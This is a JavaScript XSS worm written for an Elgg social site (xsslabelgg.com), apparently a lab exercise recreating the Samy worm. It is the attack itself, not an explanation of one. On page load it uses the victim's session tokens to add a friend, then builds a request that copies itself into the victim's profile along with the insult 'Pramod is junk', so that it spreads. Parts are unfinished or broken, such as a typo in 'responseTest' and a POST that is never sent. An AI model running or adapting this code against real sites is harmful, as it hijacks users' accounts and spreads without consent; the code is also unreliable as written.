<script type="text/javascript" id="worm">
var guid;
var ts;
var token;
function inject_worm_code() {
	var sendurl = "http://www.xsslabelgg.com/profile/".concat(elgg.session.user.name).concat("/edit")
	var Ajax=null;
	Ajax=new XMLHttpRequest();
	Ajax.onreadystatechange = function () {
		if(Ajax.readyState ==4 && Ajax.status == 200) {
			ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
			token="&__elgg_token="+elgg.security.token.__elgg_token;
			guid="&guid="+elgg.session.user.guid;
			var parser = new DOMParser();
			var xml = parser.parseFromString(Ajax.responseTest,"text/xml");
			var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
			var tailTag = "</" + "script>";
			var description = "Pramod+is+junk".concat(escape(headerTag.concat(document.getElementById("worm").innerHTML).concat(tailTag)));
			var content= token.concat(ts).concat("&name=").concat(elgg.session.user.name).concat("&description=").concat(description).concat(token).concat(guid);
			
			Ajax1=new XMLHttpRequest();
			Ajax1.onreadystatechange = function () {};
			var sendurl1 = "http://www.xsslabelgg.com/action/profile/edit";

			Ajax1.open("POST",sendurl1,true);
			Ajax1.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax1.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		}
	   	
	};
	Ajax.open("GET",sendurl,true);
	Ajax.send();

}
function add_samy_friend(){
	var sendurl2="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;  //FILL IN
//Create and send Ajax request to add friend
	var Ajax2=new XMLHttpRequest();
	Ajax2.onreadystatechange=function(){
		if(Ajax2.readyState ==4 && Ajax2.status == 200) {
			inject_worm_code();}	
	};
	Ajax2.open("GET",sendurl2,true);
	Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax2.send();
}
window.onload = function(){

var samyGuid="47";    //FILL IN

//if(elgg.session.user.guid!=samyGuid)
//{
 add_samy_friend();
//}
}
</script>
